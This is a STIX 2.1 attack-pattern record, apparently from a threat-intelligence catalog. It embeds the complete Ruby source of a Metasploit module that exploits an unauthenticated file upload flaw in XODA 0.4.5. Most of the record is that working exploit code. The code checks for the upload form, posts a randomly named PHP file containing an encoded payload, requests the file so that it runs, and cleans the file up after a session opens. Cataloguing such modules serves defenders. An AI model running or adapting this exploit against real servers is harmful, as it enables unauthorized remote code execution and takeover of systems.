{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--76ab0ac5-1d57-4445-ba75-92c549e64389",
    "created": "2024-08-14T17:13:17.777087Z",
    "modified": "2024-08-14T17:13:17.777092Z",
    "name": "\"XODA 0.4.5 Arbitrary PHP File Upload Vulnerability\"",
    "description": " This module exploits a file upload vulnerability found in XODA 0.4.5. Attackers can abuse the \"upload\" command in order to upload a malicious PHP file without any authentication, which results in arbitrary code execution. The module has been tested successfully on XODA 0.4.5 and Ubuntu 10.04.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/xoda_file_upload.rb",
            "external_id": "xoda_file_upload.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"XODA 0.4.5 Arbitrary PHP File Upload Vulnerability\",\n        'Description' => %q{\n          This module exploits a file upload vulnerability found in XODA 0.4.5. Attackers\n          can abuse the \"upload\" command in order to upload a malicious PHP file without any\n          authentication, which results in arbitrary code execution. The module has been\n          tested successfully on XODA 0.4.5 and Ubuntu 10.04.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Shai rod', # Vulnerability Discovery and PoC\n          'juan vazquez' # Metasploit module\n        ],\n        'References' => [\n          [ 'OSVDB', '85117' ],\n          [ 'BID', '55127' ],\n          [ 'EDB', '20703' ]\n        ],\n        'Payload' => {\n          'BadChars' => \"\\x00\"\n        },\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        },\n        'Platform' => ['php'],\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          ['XODA 0.4.5', {}],\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2012-08-21',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"The base path to the web application\", \"/xoda/\"])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1, 1] != '/'\n\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri' => \"#{uri}?upload_to=\"\n    })\n\n    if res and res.code == 200 and res.body =~ /Upload a file/\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def on_new_session(client)\n    print_warning(\"Deleting #{@payload_name}\")\n    if client.type == \"meterpreter\"\n      client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n      client.fs.file.rm(@payload_name)\n    else\n      client.shell_command_token(@payload_name)\n    end\n  end\n\n  def exploit\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1, 1] != '/'\n\n    peer = \"#{rhost}:#{rport}\"\n    @payload_name = Rex::Text.rand_text_alpha(rand(10) + 5) + '.php'\n\n    boundary = \"---------------------------#{Rex::Text.rand_text_numeric(27)}\"\n\n    post_data = \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"files_to_upload[]\\\"; filename=\\\"#{@payload_name}\\\"\\r\\n\\r\\n\"\n    post_data << \"<?php \"\n    post_data << payload.encoded\n    post_data << \" ?>\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"pwd\\\"\\r\\n\\r\\n\"\n    post_data << \"\\r\\n\"\n    post_data << \"--#{boundary}--\\r\\n\"\n\n    print_status(\"Sending PHP payload (#{@payload_name})\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => \"#{uri}?upload\",\n      'ctype' => \"multipart/form-data; boundary=#{boundary}\",\n      'data' => post_data\n    })\n\n    if not res or res.code != 302\n      print_error(\"File wasn't uploaded, aborting!\")\n      return\n    end\n\n    print_status(\"Executing PHP payload (#{@payload_name})\")\n\n    # Execute our payload\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => \"#{uri}files/#{@payload_name}\"\n    })\n\n    # If we don't get a 200 when we request our malicious payload, we suspect\n    # we don't have a shell, either.  Print the status code for debugging purposes.\n    if res and res.code != 200\n      print_status(\"Server returned #{res.code.to_s}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-08-21",
    "x_mitre_platforms": [
        "['php']"
    ]
}